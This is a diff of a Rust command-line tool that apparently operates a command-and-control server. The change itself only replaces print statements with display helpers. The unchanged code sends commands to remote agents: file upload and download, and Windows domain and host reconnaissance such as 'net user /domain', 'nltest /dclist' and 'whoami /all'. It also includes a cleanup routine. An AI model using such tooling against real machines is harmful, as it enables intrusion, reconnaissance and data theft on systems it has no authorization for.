@@ -4,6 +4,7 @@
 use anyhow::{anyhow, Result};
 use base64::Engine;
 
+use crate::display;
 use crate::http::{attack_once, resolve_agent_identifier, run_command_and_get_stdout};
 
 use super::CliCtx;
@@ -42,7 +43,7 @@ pub fn cmd_download_small(
         .decode(trimmed)
         .map_err(|e| anyhow!("base64 decode failed: {e}"))?;
     std::fs::write(local_path, &decoded)?;
-    println!("Saved {} bytes to {}", decoded.len(), local_path);
+    display::print_success(&format!("saved {} bytes → {}", decoded.len(), local_path));
     Ok(())
 }
 
@@ -66,13 +67,10 @@ pub fn cmd_upload_small(
         b64 = b64
     );
     attack_once(ctx.cli, ctx.base, &agent_id, &cmd)?;
-    println!(
-        "uploaded {} ({} bytes) to {}:{}",
-        local_path,
-        data.len(),
-        agent_id,
-        remote_path
-    );
+    display::print_success(&format!(
+        "uploaded {} ({} bytes) → {}:{}",
+        local_path, data.len(), agent_id, remote_path
+    ));
     Ok(())
 }
 
@@ -84,7 +82,7 @@ pub fn cmd_recon_low(ctx: &CliCtx, agent: &str) -> Result<()> {
         "systeminfo /fo csv /nh",
     ];
     for cmd in cmds {
-        println!("[recon-low] {} -> {}", agent_id, cmd);
+        display::print_dispatch("recon-low", &agent_id, cmd);
         if let Err(e) = attack_once(ctx.cli, ctx.base, &agent_id, cmd) {
             eprintln!("[recon-low] command failed: {e}");
         }
@@ -96,7 +94,7 @@ pub fn cmd_recon_noisy(ctx: &CliCtx, agent: &str) -> Result<()> {
     let agent_id = resolve_agent_identifier(ctx.cli, ctx.base, agent)?;
     let cmds = ["whoami /all", "net user /domain", "nltest /dclist"];
     for cmd in cmds {
-        println!("[recon-noisy] {} -> {}", agent_id, cmd);
+        display::print_dispatch("recon-noisy", &agent_id, cmd);
         if let Err(e) = attack_once(ctx.cli, ctx.base, &agent_id, cmd) {
             eprintln!("[recon-noisy] command failed: {e}");
         }
@@ -123,12 +121,12 @@ pub fn cmd_cleanup_windows(ctx: &CliCtx, agent: &str) -> Result<()> {
     ];
 
     for cmd in cmds {
-        println!(r#"[cleanup] agent={} cmd="{}""#, agent_id, cmd);
+        display::print_dispatch("cleanup", &agent_id, &cmd);
         if let Err(e) = attack_once(ctx.cli, ctx.base, &agent_id, &cmd) {
             eprintln!("[cleanup] failed: {}", e);
         }
     }
-    println!("cleanup-windows finished for {}", agent_id);
+    display::print_success(&format!("cleanup-windows finished for {}", agent_id));
     Ok(())
 }
 
@@ -136,7 +134,7 @@ pub fn cmd_hostinfo(ctx: &CliCtx, agent: &str) -> Result<()> {
     let agent_id = resolve_agent_identifier(ctx.cli, ctx.base, agent)?;
     let cmds = ["hostname", "whoami", "systeminfo /fo csv /nh"];
     for cmd in cmds {
-        println!(r#"[hostinfo] {} -> "{}""#, agent_id, cmd);
+        display::print_dispatch("hostinfo", &agent_id, cmd);
         if let Err(e) = attack_once(ctx.cli, ctx.base, &agent_id, cmd) {
             eprintln!("[hostinfo] command failed: {}", e);
         }
@@ -152,7 +150,7 @@ pub fn cmd_netinfo(ctx: &CliCtx, agent: &str) -> Result<()> {
         r#"type C:\Windows\System32\drivers\etc\hosts"#,
     ];
     for cmd in cmds {
-        println!(r#"[netinfo] {} -> "{}""#, agent_id, cmd);
+        display::print_dispatch("netinfo", &agent_id, cmd);
         if let Err(e) = attack_once(ctx.cli, ctx.base, &agent_id, cmd) {
             eprintln!("[netinfo] command failed: {}", e);
         }
